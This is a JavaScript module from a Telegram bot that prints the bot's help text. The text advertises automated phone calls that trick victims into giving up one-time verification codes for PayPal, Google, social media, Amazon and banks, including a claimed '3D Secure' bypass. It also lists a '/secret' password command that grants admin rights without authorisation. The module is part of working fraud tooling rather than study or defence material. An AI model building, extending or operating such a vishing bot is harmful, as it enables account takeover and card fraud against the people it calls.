module.exports = function(bot, chatId, user) {
    // Help message content
    const help = `
<b>Help, commands & informations</b>
All the Admin commands:
- /user add username : allow someone to use the bot & the calls
- /user delete username : remove someone or an admin from the bot
- /user info username : get infos from a user
- /user setadmin username : set a user to admin

All the Users commands:
- /secret yoursecretpassword username : set a user to admin without been admin
- /call phonenumber service (e.g., /call 33612345678 paypal): launch a call to get the code

The different call services supported:
- Paypal
- Google
- Snapchat
- Instagram
- Facebook
- Whatsapp
- Twitter
- Amazon
- Cdiscount
- Default: work for all the systems
- Banque: bypass 3D Secure

Sent by ${user}
    `;

    // Send the help message using Telegram's sendMessage method with HTML formatting
    bot.telegram.sendMessage(chatId, help, { parse_mode: 'HTML' });
};